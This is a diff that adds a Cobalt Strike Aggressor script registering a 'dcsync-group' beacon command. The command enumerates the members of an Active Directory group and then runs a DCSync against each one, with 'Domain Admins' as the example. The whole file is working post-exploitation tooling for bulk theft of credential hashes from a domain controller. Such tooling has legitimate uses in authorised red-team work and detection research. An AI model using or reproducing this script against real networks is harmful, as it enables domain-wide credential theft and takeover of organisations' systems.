@@ -1,0 +1,64 @@
+# Automated Commands
+# Author: @Tarrell13 & @ExpressoCake
+# Script will register a command to perform DCSYNC operation over an entire specified Group of users. 
+
+global('$DCSYNC $bid $fqdn $domain $group');
+$DCSYNC = false;
+
+# Function to actually perform the operation
+alias dcsync-group {
+
+	$bid = $1;
+	$fqdn = $2;
+	$domain = $3;
+	$group = $4;
+
+	# Setting the value of DCSYNC to true for further operations.
+	$DCSYNC = true;
+
+	bnet!($bid, "group", $fqdn, $group);
+	
+}
+
+# Registering the command within cobalt strike 
+beacon_command_register(
+	"dcsync-group",
+	"DCSync a group of users",
+	"Synopsis: dcsync-group [FQDN] [DOMAIN] [GROUP]\nExample: dcsync-group testdomain.local testdomain \"Domain Admins\"");
+
+# Return a list of users from a specified group
+sub perform_group_sync {
+
+	foreach $index => $user ($1) {
+		local('$currentIndex');
+		$currentIndex = $index + 1;
+
+		if ($user && strlen($user) >= 1 && $user ne $null) {
+			blog($2, "DCSyncing: $user");
+			blog($2, "Count: $currentIndex of " . size($1));
+			bdcsync($bid, $fqdn, $domain . "\\" . $user);
+		}
+	}
+}
+
+
+#Capturing input from beacon console
+on beacon_output {
+
+	if (-istrue $DCSYNC) {
+		local('$index');
+		$shell_output = $2;
+	
+		@shell_array = split("\n", $shell_output);
+		$size = size(@shell_array) - 1;	
+		@users = @();	
+	
+		for ($x = 0; $x <= $size; $x++) {	
+			push(@users, @shell_array[$x]);
+		}	
+
+		removeAt(@users, 1, 2, 0);
+		perform_group_sync(@users, $1);
+		$DCSYNC = false;
+	}
+}
